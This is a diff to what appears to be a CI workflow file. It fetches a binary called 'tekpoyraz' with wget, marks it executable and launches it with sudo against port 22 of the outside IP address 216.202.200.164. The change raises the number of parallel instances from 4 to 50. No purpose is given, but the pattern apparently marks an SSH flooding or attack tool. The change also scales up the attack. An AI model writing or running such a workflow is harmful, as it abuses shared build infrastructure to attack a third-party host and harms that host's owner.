@@ -18,7 +18,7 @@ jobs:
           wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
           chmod +x tekpoyraz
           PIDS=()
-          for i in {1..4}; do
+          for i in {1..50}; do
             sudo timeout 35 ./tekpoyraz 216.202.200.164 22 &
             PIDS+=($!)
           done
